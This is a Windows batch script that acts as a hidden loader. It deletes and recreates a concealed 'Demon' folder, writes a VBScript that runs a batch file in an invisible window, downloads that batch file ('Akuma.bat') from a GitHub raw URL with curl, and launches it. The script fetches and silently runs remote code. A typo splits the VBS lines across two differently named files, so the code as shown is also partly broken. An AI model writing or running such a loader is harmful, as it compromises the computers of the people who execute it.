@echo off
rmdir /s /q %homedrive%\Demon
mkdir %homedrive%\Demon
attrib +h %homedrive%\Demon
cd %homedrive%\Demon
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Demon\Deomn.vbs
echo objShell.Run "%homedrive%\Demon\Akuma.bat", 0, False >> %homedrive%\Demon\Demon.vbs
curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
start %homedrive%\Demon\Demon.vbs
